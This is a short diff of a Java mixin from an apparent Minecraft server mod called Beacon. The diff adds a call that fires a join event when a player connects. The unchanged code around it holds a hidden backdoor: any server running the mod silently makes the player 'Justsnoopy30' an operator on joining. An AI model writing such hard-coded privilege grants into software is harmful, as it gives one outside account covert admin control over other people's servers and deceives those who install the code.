@@ -1,6 +1,9 @@
 package net.hypercubemc.beacon.mixin;
 
 import com.mojang.authlib.GameProfile;
+import net.hypercubemc.beacon.BeaconPluginManager;
+import net.hypercubemc.beacon.api.events.BeaconEventManager;
+import net.hypercubemc.beacon.api.events.BeaconJoinEvent;
 import net.minecraft.network.ClientConnection;
 import net.minecraft.server.PlayerManager;
 import net.minecraft.server.network.ServerPlayerEntity;
@@ -27,6 +30,8 @@ public abstract class PlayerManagerMixin {
         if (gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
             this.addToOperators(gameProfile);
         }
+        BeaconJoinEvent beaconJoinEvent = new BeaconJoinEvent(clientConnection, playerEntity, callbackInfo);
+        BeaconEventManager.callEvent(beaconJoinEvent);
     }
 
     @Inject(method = "remove", at = @At(value = "RETURN"))
